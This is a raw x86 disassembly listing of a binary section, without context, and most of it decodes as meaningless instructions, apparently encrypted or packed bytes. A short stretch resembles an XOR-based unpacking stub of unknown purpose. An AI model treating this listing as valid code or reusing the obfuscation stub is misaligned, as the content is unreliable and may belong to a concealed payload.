  40887e:	loope  0x40884a
  408880:	mov    ecx,ebp
  408882:	sbb    edi,DWORD PTR [esi]
  408884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408885:	ret    
  408886:	jnp    0x4088e6
  408888:	xor    DWORD PTR [esp+edi*1],edi
  40888b:	lock sbb DWORD PTR [edx],ebp
  40888e:	and    esp,DWORD PTR [edi]
  408890:	arpl   WORD PTR [ecx],bx
  408892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408893:	sbb    DWORD PTR [ebx+esi*2],0xffffffd0
  408897:	dec    edi
  408898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408899:	in     al,dx
  40889a:	aas    
  40889b:	push   cs
  40889c:	push   ss
  40889d:	jne    0x4088d6
  40889f:	scas   eax,DWORD PTR es:[edi]
  4088a0:	sbb    BYTE PTR [edi-0x19543fb2],0x86
  4088a7:	aas    
  4088a8:	cmp    esi,ebx
  4088aa:	test   al,0x3d
  4088ac:	push   esi
  4088ad:	daa    
  4088ae:	popa   
  4088af:	out    dx,eax
  4088b0:	je     0x408919
  4088b2:	dec    esp
  4088b3:	(bad)  ss:[esi+edx*2+0x3b]
  4088b8:	outs   dx,DWORD PTR ds:[esi]
  4088b9:	add    al,BYTE PTR [esp+ecx*2+0x74]
  4088bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088be:	ror    BYTE PTR [ebp-0x17e48ad4],1
  4088c4:	mov    eax,ds:0xc3f6d940
  4088c9:	xor    ch,bl
  4088cb:	(bad)  
  4088cc:	repz loope 0x4088d2
  4088cf:	mov    DWORD PTR [ecx+0x2e],ebx
  4088d2:	push   eax
  4088d3:	pushf  
  4088d4:	dec    eax
  4088d5:	(bad)  
  4088d6:	push   ebp
  4088d7:	add    edx,edi
  4088d9:	sbb    DWORD PTR ds:0xf76c063a,esp
  4088df:	sub    DWORD PTR es:[edx],ebx
  4088e2:	sbb    al,0xcf
  4088e4:	and    cl,BYTE PTR ds:0x9116fec2
  4088ea:	add    ecx,0x78
  4088ed:	loop   0x40896a
  4088ef:	add    bh,ah
  4088f1:	inc    edi
  4088f2:	enter  0x3896,0xe2
  4088f6:	stos   DWORD PTR es:[edi],eax
  4088f7:	mov    edx,0x5ea6b978
  4088fc:	mov    cr2,ebp
  4088ff:	js     0x40892b
  408901:	mov    WORD PTR [edi],ds
  408903:	pop    ecx
  408904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408905:	int    0xe6
  408907:	xor    ah,dl
  408909:	push   ss
  40890a:	in     eax,dx
  40890b:	(bad)  
  40890c:	fisubr WORD PTR [esi*1+0x49379a01]
  408913:	scas   al,BYTE PTR es:[edi]
  408914:	js     0x408904
  408916:	jbe    0x408907
  408918:	mov    ecx,0xadf5b6d6
  40891d:	rol    dl,0x5e
  408920:	mov    edi,0xe5d01674
  408925:	push   eax
  408926:	mov    ah,BYTE PTR [edx]
  408928:	aaa    
  408929:	mov    esi,0x51f49326
  40892e:	mov    bh,bl
  408930:	jmp    0x470a:0x89c0c1cd
  408937:	jo     0x4088bd
  408939:	mov    bh,0x77
  40893b:	in     eax,0x9c
  40893d:	add    BYTE PTR [edx-0x35bc9840],cl
  408943:	jae    0x40892c
  408945:	jne    0x40890f
  408947:	mov    al,ds:0xdc104970
  40894c:	push   eax
  40894d:	lock mov bl,0x1c
  408950:	cli    
  408951:	pusha  
  408952:	or     ebx,DWORD PTR [edi]
  408954:	icebp  
  408955:	(bad)  
  408956:	cld    
  408957:	into   
  408958:	sbb    DWORD PTR [eax],0x77
  40895b:	ficom  DWORD PTR [ebx]
  40895d:	sub    ecx,0x1f
  408960:	jmp    0x9679:0x5eb7a2de
  408967:	jbe    0x4089a7
  408969:	call   0xf8396795
  40896e:	adc    BYTE PTR [eax+edi*4],cl
  408971:	inc    ebp
  408972:	mov    ebp,0x7c825af4
  408977:	xchg   DWORD PTR [esi-0x3bab2f4e],esp
  40897d:	dec    eax
  40897e:	je     0x4089fb
  408980:	jns    0x408963
  408982:	adc    edi,ebp
  408984:	ins    DWORD PTR es:[edi],dx
  408985:	pushf  
  408986:	stos   BYTE PTR es:[edi],al
  408987:	mov    ebx,0x5e581006
  40898c:	test   BYTE PTR [bp+si+0x29],bl
  408990:	loopne 0x408994
  408992:	lea    ebp,[ebp-0x1d]
  408995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408996:	pushf  
  408997:	mov    eax,0x488df431
  40899c:	pop    es
  40899d:	jbe    0x40897f
  40899f:	jne    0x408989
  4089a1:	and    DWORD PTR [esi+ecx*8+0x333aa4ec],eax
  4089a8:	dec    esi
  4089a9:	adc    eax,0x6792785
  4089ae:	mov    dh,0x38
  4089b0:	fstp   DWORD PTR [esp+ebx*2+0x53b69a7a]
  4089b7:	xchg   al,ch
  4089b9:	pop    edi
  4089ba:	mov    bh,0xff
  4089bc:	(bad)  
  4089bd:	cmc    
  4089be:	mov    ecx,gs
  4089c0:	hlt    
  4089c1:	in     eax,0x34
  4089c3:	mov    ecx,0x53260f2d
  4089c8:	mov    ebp,0x381838fe
  4089cd:	mov    esp,0xf8136156
  4089d2:	adc    dh,BYTE PTR [edx]
  4089d4:	pop    edi
  4089d5:	mov    ch,0x39
  4089d7:	ud2    
  4089d9:	fild   WORD PTR [ecx+0x40]
  4089dc:	mov    ecx,0x1d5343f0
  4089e1:	or     eax,0x5f21e177
  4089e6:	adc    ah,BYTE PTR ds:0xb77539c
  4089ec:	outs   dx,BYTE PTR ds:[esi]
  4089ed:	mov    cl,BYTE PTR [esi+0x2cb32b59]
  4089f3:	shr    BYTE PTR [edx-0x46734c94],1
  4089f9:	in     al,0xcb
  4089fb:	cwde   
  4089fc:	sti    
  4089fd:	adc    al,0x14
  4089ff:	imul   ecx,ebx,0x63d54a01
  408a05:	lea    ebx,[ecx]
  408a07:	sub    bl,BYTE PTR [ebp-0x1]
  408a0a:	std    
  408a0b:	push   0x75
  408a0d:	add    cl,ch
  408a0f:	mov    DWORD PTR [esi],edx
  408a11:	mov    eax,0xd9fc8eda
  408a16:	xchg   ebx,eax
  408a17:	mov    gs,WORD PTR [edi-0x80]
  408a1a:	in     al,dx
  408a1b:	ja     0x4089de
  408a1d:	sti    
  408a1e:	jmp    0x97ce244e
  408a23:	lods   al,BYTE PTR ds:[esi]
  408a24:	push   esi
  408a25:	scas   eax,DWORD PTR es:[edi]
  408a26:	mov    edx,0x4953b0a8
  408a2b:	xchg   ebp,eax
  408a2c:	push   0x5
  408a2e:	jg     0x408aa6
  408a30:	mov    ch,0x7a
  408a32:	pop    ss
  408a33:	inc    esi
  408a34:	(bad)  
  408a35:	sub    eax,0xd64bcb28
  408a3a:	iret   
  408a3b:	mov    esp,0x4444de4b
  408a40:	inc    ebp
  408a41:	pop    edx
  408a42:	mov    ebx,0x42898b58
  408a47:	imul   ebp,DWORD PTR [ebx+eax*4+0x6],0x33800f00
  408a4f:	push   ebp
  408a50:	mov    DWORD PTR [ebp-0x1f07bad0],0xe9ecac0a
  408a5a:	gs jno 0x408a9a
  408a5d:	dec    ebx
  408a5e:	mov    ah,0x9a
  408a60:	inc    edi
  408a61:	adc    al,0xae
  408a63:	inc    ebx
  408a64:	lods   eax,DWORD PTR ds:[esi]
  408a65:	xor    eax,0xc37c3c7f
  408a6a:	add    al,0xa0
  408a6c:	cmc    
  408a6d:	push   es
  408a6e:	cld    
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x9ab3a4f9
  408a92:	es mov ch,0xd
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408b12
  408a9e:	outs   dx,BYTE PTR ds:[esi]
  408a9f:	add    ebp,DWORD PTR [eax]
  408aa1:	hlt    
  408aa2:	push   ebp
  408aa3:	retf   0xfa1f
  408aa6:	(bad)  
  408aa7:	int    0x8a
  408aa9:	jo     0x408aa6
  408aab:	mov    ah,0x35
  408aad:	fs jmp 0x7920:0x7a1876f
  408ab5:	in     al,dx
  408ab6:	or     al,0x99
  408ab8:	add    DWORD PTR [eax+edi*1+0x7c],0xffffffa2
  408abd:	xchg   esi,eax
  408abe:	rep lods eax,DWORD PTR ds:[esi]
  408ac0:	pop    esi
  408ac1:	int    0x94
  408ac3:	mov    al,BYTE PTR [edi-0x9]
  408ac6:	push   0x54
  408ac8:	int    0x31
  408aca:	les    esp,FWORD PTR [edx]
  408acc:	mov    bh,0xfe
  408ace:	cmp    ebp,esp
  408ad0:	sahf   
  408ad1:	nop
  408ad2:	push   edx
  408ad3:	imul   esi,DWORD PTR [edi-0x50],0x15
  408ad7:	call   0x506cc5d2
  408adc:	sbb    al,0xd8
  408ade:	in     eax,0x15
  408ae0:	dec    edi
  408ae1:	inc    edi
  408ae2:	jae    0x408b54
  408ae4:	mov    bl,0x6a
  408ae6:	adc    eax,0xbb6dcd4c
  408aeb:	ds push ebx
  408aed:	fld    QWORD PTR [eax]
  408aef:	retf   0xf795
  408af2:	rcr    DWORD PTR [esi],0x21
  408af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408af6:	dec    edx
  408af7:	into   
  408af8:	fst    QWORD PTR [ebx-0x4d]
  408afb:	icebp  
  408afc:	push   ebx
  408afd:	loope  0x408b3e
  408aff:	mov    ah,0xbc
  408b01:	push   ebx
  408b02:	mov    cl,0x43
  408b04:	inc    ecx
  408b05:	fldenv [esp]
  408b08:	jae    0x408b6f
  408b0a:	inc    BYTE PTR [edi+0xb]
  408b0d:	mov    ecx,0x4e367f06
  408b12:	push   es
  408b13:	test   BYTE PTR [edi-0x31],ah
  408b16:	leave  
  408b17:	mov    ch,0x51
  408b19:	cmp    eax,0xbddb1f44
  408b1f:	scas   eax,DWORD PTR es:[edi]
  408b20:	sub    eax,0x8a47e8cd
  408b25:	cwde   
  408b26:	add    BYTE PTR [eax-0x59829539],bh
  408b2c:	fs pushf 
  408b2e:	mov    esi,0xa5eee78e
  408b33:	or     eax,0x5fa76461
  408b38:	adc    DWORD PTR [ecx+0x1f],eax
  408b3b:	add    BYTE PTR [edx-0x77f9a11a],ah
  408b41:	call   0xcdad:0xb885489b
  408b48:	mov    al,0x4d
  408b4a:	pop    ds
  408b4b:	stos   BYTE PTR es:[edi],al
  408b4c:	push   ebp
  408b4d:	add    esp,DWORD PTR [ebp+0x2d]
  408b50:	mov    ds:0xbf665366,al
  408b55:	das    
  408b56:	fld    st(2)
  408b58:	loop   0x408b29
  408b5a:	push   es
  408b5b:	cwde   
  408b5c:	adc    edi,DWORD PTR [edi-0x3ce3ed6a]
  408b62:	sbb    BYTE PTR [ecx],bh
  408b64:	add    esp,DWORD PTR [edx-0x77]
  408b67:	pop    es
  408b68:	jno    0x408af2
  408b6a:	cmp    BYTE PTR [ecx-0xfdca6d5],dh
  408b70:	enter  0xa0a,0x87
  408b74:	xchg   ecx,eax
  408b75:	sbb    DWORD PTR [ecx+0x49],0xffffff84
  408b79:	int3   
  408b7a:	scas   al,BYTE PTR es:[edi]
  408b7b:	mov    esi,0x56cb0420
  408b80:	push   ecx
  408b81:	retf   0x4648
  408b84:	iret   
  408b85:	inc    edx
  408b86:	xlat   BYTE PTR ds:[ebx]
  408b87:	rol    BYTE PTR [edx+eiz*2+0x10c5cac5],cl
  408b8e:	ins    DWORD PTR es:[edi],dx
  408b8f:	mov    cl,0x4a
  408b91:	sub    eax,0x1bfce397
  408b96:	dec    edx
  408b97:	imul   esi,DWORD PTR [eax+ebp*4+0xa],0xffffffba
  408b9c:	fsub   DWORD PTR [esp+edi*8]
  408b9f:	mov    cl,0xb5
  408ba1:	mov    ecx,DWORD PTR [esi-0x50]
  408ba4:	aam    0xf1
  408ba6:	daa    
  408ba7:	sbb    eax,0xf2f2d12d
  408bac:	or     ebp,DWORD PTR [esi]
  408bae:	cs std 
  408bb0:	in     al,dx
  408bb1:	jge    0x408c27
  408bb3:	push   0x96be474d
  408bb8:	out    dx,eax
  408bb9:	pop    esp
  408bba:	dec    ebx
  408bbb:	sub    DWORD PTR [esi+0x55a8479f],edx
  408bc1:	les    ecx,FWORD PTR [ebp+0x31]
  408bc4:	imul   ebp,DWORD PTR [edi],0x64156a51
  408bca:	out    0x7b,al
  408bcc:	sub    al,0xc7
  408bce:	dec    ebp
  408bcf:	pop    edi
  408bd0:	test   al,0x87
  408bd2:	fdivr  QWORD PTR [edi-0x63d7f419]
  408bd8:	test   eax,0x1eb4631f
  408bdd:	cmp    al,BYTE PTR [ecx]
  408bdf:	dec    edi
  408be0:	jecxz  0x408bea
  408be2:	das    
  408be3:	mov    eax,ds:0x87ca76a9
  408be8:	cdq    
  408be9:	data16 add al,ah
  408bec:	mov    esp,0x32315dd9
  408bf1:	ror    DWORD PTR [eax+0xa6acd2],1
  408bf7:	mov    al,bh
  408bf9:	aad    0xf4
  408bfb:	(bad)  
  408bfc:	pop    esp
  408bfd:	or     al,0xe0
  408bff:	xchg   BYTE PTR [edx+0x5d],ah
  408c02:	hlt    
  408c03:	sub    edi,DWORD PTR [ebx]
  408c05:	add    cl,BYTE PTR [edi]
  408c07:	retf   
  408c08:	in     al,0xbb
  408c0a:	xlat   BYTE PTR ds:[ebx]
  408c0b:	pop    ecx
  408c0c:	loope  0x408c54
  408c0e:	sub    DWORD PTR [edi-0x19],ebx
  408c11:	cmp    eax,0xcf7f1c9
  408c16:	and    dh,BYTE PTR [edx]
  408c18:	and    al,BYTE PTR [ebx-0x7f]
  408c1b:	sub    esi,DWORD PTR [ecx]
  408c1d:	aas    
  408c1e:	ins    DWORD PTR es:[edi],dx
  408c1f:	pusha  
  408c20:	jp     0x408c3e
  408c22:	pop    esp
  408c23:	sahf   
  408c24:	mov    cl,0x56
  408c26:	mov    ebp,eax
  408c28:	stc    
  408c29:	(bad)  
  408c2a:	pop    ebp
  408c2b:	(bad)  
  408c2c:	stos   BYTE PTR es:[edi],al
  408c2d:	mov    ecx,0x307f8cda
  408c32:	cdq    
  408c33:	ret    
  408c34:	inc    edi
  408c35:	ins    BYTE PTR es:[edi],dx
  408c36:	jmp    0x408c0f
  408c38:	jno    0x408bfa
  408c3a:	xchg   esp,eax
  408c3b:	repnz std 
  408c3d:	sub    eax,0x4df1973a
  408c42:	test   ebx,0xed4c50ee
  408c48:	mov    ds:0x4eb1c875,eax
  408c4d:	call   0x3aa4c6dc
  408c52:	mov    ecx,DWORD PTR [eax-0x28]
  408c55:	push   ecx
  408c56:	iret   
  408c57:	pop    ss
  408c58:	cmp    BYTE PTR [edx-0x25],bl
  408c5b:	mov    BYTE PTR [esi-0x20],dl
  408c5e:	loope  0x408c67
  408c60:	xchg   edx,eax
  408c61:	retf   0x54e2
  408c64:	sti    
  408c65:	add    al,0xfc
  408c67:	(bad)  
  408c69:	stos   DWORD PTR es:[edi],eax
  408c6a:	dec    esi
  408c6b:	(bad)  
  408c6c:	mov    cl,0x8
  408c6e:	shl    BYTE PTR [ebp+0x4137581],cl
  408c74:	scas   al,BYTE PTR es:[edi]
  408c75:	sbb    DWORD PTR [ebp+0x31],eax
  408c78:	xor    ah,BYTE PTR [edi-0x1a]
  408c7b:	dec    esi
  408c7c:	cmc    
  408c7d:	ret    0x5be8
  408c80:	nop
  408c81:	fnstsw WORD PTR ds:0x7e3d95af
  408c87:	add    al,0x88
  408c89:	in     eax,0xf2
  408c8b:	pop    ds
  408c8c:	xor    ebp,DWORD PTR [esi-0x7fff870b]
  408c92:	(bad)
  408c95:	jbe    0x408cd9
  408c97:	loope  0x408c22
  408c99:	aas    
  408c9a:	(bad)  
  408c9b:	push   edx
  408c9c:	mov    bl,0x18
  408c9e:	(bad)
  408ca1:	push   ds
  408ca2:	jge    0x408c8f
  408ca4:	pop    edi
  408ca5:	fwait
  408ca6:	pop    ebx
  408ca7:	cmp    ecx,DWORD PTR [edx-0x7f]
  408caa:	inc    esp
  408cab:	imul   ebx
  408cad:	pop    edx
  408cae:	in     al,dx
  408caf:	jg     0x408c51
  408cb1:	daa    
  408cb2:	idiv   BYTE PTR [edx+0x6603a720]
  408cb8:	not    ch
  408cba:	div    BYTE PTR [eax]
  408cbc:	lock sub BYTE PTR [edx+0x1aeaf204],ah
  408cc3:	cmp    BYTE PTR ds:0x1ed140e4,0x8d
  408ccb:	mov    ah,0x37
  408ccd:	aam    0x14
  408ccf:	add    BYTE PTR [esi+ebx*4+0x1576e354],dh
  408cd6:	inc    edi
  408cd7:	jp     0x408cb3
  408cd9:	dec    eax
  408cda:	sahf   
  408cdb:	repnz (bad) 
  408cdd:	or     edx,DWORD PTR [eax+0x18241158]
  408ce3:	push   es
  408ce4:	mov    ecx,0xbaef2b9d
  408ce9:	adc    BYTE PTR [ecx],dh
  408ceb:	test   eax,0xb1119305
  408cf0:	(bad)  
  408cf1:	in     al,dx
  408cf2:	dec    ecx
  408cf3:	stos   BYTE PTR es:[edi],al
  408cf4:	nop
  408cf5:	xor    eax,0x5ab999a2
  408cfa:	fisttp DWORD PTR [eax]
  408cfc:	push   es
  408cfd:	jbe    0x408d1c
  408cff:	sbb    BYTE PTR [edx+0x49],dl
  408d02:	add    DWORD PTR [ecx-0xb],esi
  408d05:	hlt    
  408d06:	fwait
  408d07:	mov    edx,0x2a38d241
  408d0c:	pop    edi
  408d0d:	push   eax
  408d0e:	pop    edi
  408d0f:	ins    BYTE PTR es:[edi],dx
  408d10:	mov    gs,WORD PTR [esi+0x358fc3c1]
  408d16:	inc    ecx
  408d17:	jle    0x408cdb
  408d19:	jle    0x408d36
  408d1b:	add    eax,0x3be70be1
  408d20:	icebp  
  408d21:	xor    BYTE PTR [ecx-0x30207069],0x65
  408d28:	push   edi
  408d29:	push   ebp
  408d2a:	lea    edx,[ebp-0x21]
  408d2d:	lea    ebx,[eax-0x2273b2d9]
  408d33:	xor    ecx,DWORD PTR [ebx+0x3109c112]
  408d39:	test   DWORD PTR [ebp+0x45c56612],edi
  408d3f:	xor    ebp,0x2b
  408d42:	push   0xc7f6957c
  408d47:	inc    ebp
  408d48:	clc    
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a88d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a8ad,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7e1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7e1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7e1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7e1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7e1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7e1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7e1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7e1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a815
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7dd
  408de2:	mov    DWORD PTR ds:0x42a815,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a829,0x42a785
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a79d,0x42a819
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0x3e
  408e1d:	test   BYTE PTR [ebp+0x78ea6749],al
  408e23:	js     0x408dcc
  408e25:	jle    0x408e9f
  408e27:	js     0x408e58
  408e29:	dec    edi
  408e2a:	sub    al,0xde
  408e2c:	jbe    0x408e63
  408e2e:	ret    0xf5cf
  408e31:	popf   
  408e32:	cdq    
  408e33:	repnz fwait
  408e35:	jae    0x408e9d
  408e37:	scas   eax,DWORD PTR es:[edi]
  408e38:	cmp    DWORD PTR [ecx-0x1e],0xb678b7a5
  408e3f:	leave  
  408e40:	or     eax,0x37eb34ff
  408e45:	adc    bl,BYTE PTR ds:0x6a5ae695
  408e4b:	or     eax,0x17c3151c
  408e50:	cmp    BYTE PTR [ebp-0x410f2433],0xf
  408e57:	jne    0x408e9e
  408e59:	or     BYTE PTR [ebx+0x7e],ch
  408e5c:	push   ecx
  408e5d:	dec    ecx
  408e5e:	push   ss
  408e5f:	int    0x4c
  408e61:	mov    cl,0x1b
  408e63:	push   esi
  408e64:	imul   esi,DWORD PTR [ebx+0x54],0x2dc94ba8
  408e6b:	add    al,0x2
  408e6d:	(bad)  
  408e6e:	jbe    0x408e4b
  408e70:	dec    esp
  408e71:	add    cl,BYTE PTR [edx+0x3b]
  408e74:	sub    eax,0xea6c68c7
  408e79:	dec    edi
  408e7a:	scas   eax,DWORD PTR es:[edi]
  408e7b:	and    bh,BYTE PTR [edi+0x46]
  408e7e:	test   eax,eax
  408e80:	call   0xe347d5d2
  408e85:	and    DWORD PTR [ebp-0x7e543663],edi
  408e8b:	stos   DWORD PTR es:[edi],eax
  408e8c:	in     eax,0x93
  408e8e:	pop    edx
  408e8f:	mov    ebx,0xde32d3a6
  408e94:	int3   
  408e95:	push   edi
  408e96:	hlt    
  408e97:	setg   BYTE PTR [eax]
  408e9a:	adc    al,0x23
  408e9c:	and    eax,DWORD PTR [ebx]
  408e9e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  408ea0:	cmp    eax,0xfb2fa0f4
  408ea5:	pop    esi
  408ea6:	mov    esp,edi
  408ea8:	inc    esi
  408ea9:	stos   DWORD PTR es:[edi],eax
  408eaa:	mov    bh,0x6b
  408eac:	mov    esi,DWORD PTR ds:0x2cdbfe6c
  408eb2:	sbb    DWORD PTR [ebp-0x4f88922d],ebx
  408eb8:	rol    bh,cl
  408eba:	sbb    al,0x1
  408ebc:	xchg   dl,cl
  408ebe:	(bad)  
  408ebf:	jmp    0x408f09
  408ec1:	mov    ch,0xd2
  408ec3:	jecxz  0x408e8f
  408ec5:	lds    edi,FWORD PTR [edi]
  408ec7:	(bad)  
  408ec8:	leave  
  408ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eca:	ret    
  408ecb:	call   0x3e9a:0x2d577c9a
  408ed2:	in     al,dx
  408ed3:	sbb    al,0xef
  408ed5:	xor    eax,0xec72e75c
  408eda:	cmp    ah,cl
  408edc:	xor    eax,0xa1d26c7
  408ee1:	pop    ebp
  408ee2:	or     bh,BYTE PTR [esi+0x7b]
  408ee5:	(bad)  
  408ee6:	enter  0x38b5,0x21
  408eea:	xchg   DWORD PTR [ecx],edx
  408eec:	sub    cl,BYTE PTR [eax]
  408eee:	mov    dl,0xfc
  408ef0:	(bad)  
  408ef2:	out    0x76,al
  408ef4:	sub    ch,BYTE PTR [ecx]
  408ef6:	jbe    0x408ebe
  408ef8:	jno    0x408f46
  408efa:	(bad)  [edi+0xb]
  408efd:	ret    0xaef7
  408f00:	(bad)  
  408f01:	adc    DWORD PTR [ecx-0x4],ebp
  408f04:	push   0xc7292ff3
  408f09:	lods   al,BYTE PTR ds:[esi]
  408f0a:	(bad)  
  408f0b:	mov    bh,0x46
  408f0d:	test   BYTE PTR [edx-0x43],al
  408f10:	pop    esp
  408f11:	inc    edi
  408f12:	and    bh,dl
  408f14:	sbb    BYTE PTR [edi+ebp*2+0x44],bl
  408f18:	loop   0x408edc
  408f1a:	adc    DWORD PTR [edi-0x7b],ebp
  408f1d:	popa   
  408f1e:	scas   eax,DWORD PTR es:[edi]
  408f1f:	in     eax,0xdd
  408f21:	mov    eax,0xfe4b6702
  408f26:	es cwde 
  408f28:	mov    ebx,0xbe2195d4
  408f2d:	add    BYTE PTR [edx-0x4f653cb4],ch
  408f33:	mov    ah,BYTE PTR [edx]
  408f35:	loope  0x408f45
  408f37:	(bad)  
  408f39:	inc    esp
  408f3a:	adc    al,dl
  408f3c:	xchg   ebp,eax
  408f3d:	inc    ebx
  408f3e:	mov    al,ds:0x77b90b4d
  408f43:	push   esi
  408f44:	jg     0x408f2d
  408f46:	inc    esi
  408f47:	inc    eax
  408f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f49:	leave  
  408f4a:	cmp    eax,DWORD PTR [esi+0x39]
  408f4d:	loop   0x408f15
  408f4f:	(bad)  
  408f50:	sbb    DWORD PTR [eax-0x17],edi
  408f53:	rcl    BYTE PTR [ebx+0x5d],cl
  408f56:	imul   esp,DWORD PTR [ebx],0x3e6953e0
  408f5c:	lods   al,BYTE PTR ds:[esi]
  408f5d:	icebp  
  408f5e:	or     BYTE PTR [esp+ecx*1],bh
  408f61:	and    al,0xb6
  408f63:	jbe    0x408f44
  408f65:	loop   0x408f4e
  408f67:	sti    
  408f68:	jmp    0x408f4c
  408f6a:	out    0xd7,eax
  408f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f6d:	mov    al,ds:0x6283aa39
  408f72:	out    0x98,al
  408f74:	push   edi
  408f75:	sub    al,0x6d
  408f77:	jl     0x408fcd
  408f79:	arpl   WORD PTR ds:[edi],bx
  408f7c:	sbb    eax,0x42e643f7
  408f81:	loop   0x408ffb
  408f83:	dec    esi
  408f84:	xor    BYTE PTR [esi],ah
  408f86:	xor    dh,dh
  408f88:	xor    DWORD PTR [ecx],edi
  408f8a:	test   DWORD PTR [esi],edx
  408f8c:	mov    dl,0xd6
  408f8e:	push   esp
  408f8f:	retf   0xe986
  408f92:	adc    esi,ebx
  408f94:	mov    esi,0xd47600a
  408f99:	(bad)  
  408f9a:	in     al,dx
  408f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f9c:	cmp    esp,DWORD PTR [esi]
  408f9e:	sbb    eax,0x9443a708
  408fa3:	and    eax,0x5b8a4a31
  408fa8:	mov    bh,0x37
  408faa:	ins    DWORD PTR es:[edi],dx
  408fab:	adc    eax,0x96202b1e
  408fb0:	cdq    
  408fb1:	dec    ebx
  408fb2:	sub    eax,edx
  408fb4:	add    ebx,ecx
  408fb6:	(bad)  
  408fb7:	call   0x22c84e79
  408fbc:	jg     0x40901e
  408fbe:	jp     0x408f45
  408fc0:	pushf  
  408fc1:	ror    BYTE PTR [edx-0x72],cl
  408fc4:	add    eax,0xe8daf7f3
  408fc9:	(bad)  
  408fca:	fiadd  WORD PTR [ebx]
  408fcc:	aad    0xea
  408fce:	js     0x408fc5
  408fd0:	test   al,0xde
  408fd2:	(bad)  
  408fd3:	cld    
  408fd4:	push   ss
  408fd5:	mov    ah,0x16
  408fd7:	dec    edi
  408fd8:	pop    ss
  408fd9:	pop    ecx
  408fda:	sbb    esi,DWORD PTR [eax]
  408fdc:	or     DWORD PTR [esi],ebp
  408fde:	sbb    al,0x75
  408fe0:	xor    BYTE PTR [edx+edx*1],al
  408fe3:	dec    eax
  408fe4:	aad    0xfb
  408fe6:	test   esp,ecx
  408fe8:	mov    ah,0xad
  408fea:	lods   eax,DWORD PTR ds:[esi]
  408feb:	movups xmm6,xmm3
  408fee:	shr    BYTE PTR [esi-0x22],1
  408ff1:	xor    ecx,DWORD PTR [eax-0x26]
  408ff4:	lds    ebx,FWORD PTR [esi+0x6fc21b37]
  408ffa:	push   ebp
  408ffb:	mov    ds:0xdc32c71a,eax
  409000:	sahf   
  409001:	jecxz  0x408ff2
  409003:	xlat   BYTE PTR ss:[ebx]
  409005:	cmp    ebp,0xd0917558
  40900b:	cmovo  ebx,DWORD PTR [eax-0x45]
  40900f:	fcomp  DWORD PTR ds:0x40573c34
  409015:	or     edi,DWORD PTR [ebx+0x1ea6544c]
  40901b:	sbb    eax,esp
  40901d:	out    dx,al
  40901e:	cmp    eax,0xf641517a
  409023:	fdivr  QWORD PTR [esi]
  409025:	mov    bh,0x98
  409027:	jle    0x40902a
  409029:	scas   al,BYTE PTR es:[edi]
  40902a:	mov    dl,0x3d
  40902c:	pop    eax
  40902d:	int    0xc3
  40902f:	cwde   
  409030:	popa   
  409031:	mov    ebp,0x3d1865f9
  409036:	mov    eax,0x1161a4c6
  40903b:	jge    0x4090ba
  40903d:	(bad)  
  40903e:	xor    edi,DWORD PTR [ebx+0x1b]
  409041:	xlat   BYTE PTR ds:[ebx]
  409042:	aad    0x75
  409044:	retf   0x2bc0
  409047:	mov    esp,0xed62df8f
  40904c:	adc    edx,DWORD PTR [eax+0x36a1a38d]
  409052:	retf   0xa892
  409055:	pop    eax
  409056:	fld    DWORD PTR [ecx-0x125c896a]
  40905c:	dec    edx
  40905d:	stos   BYTE PTR es:[edi],al
  40905e:	stos   DWORD PTR es:[edi],eax
  40905f:	loop   0x40902e
  409061:	mov    cl,ch
  409063:	out    dx,al
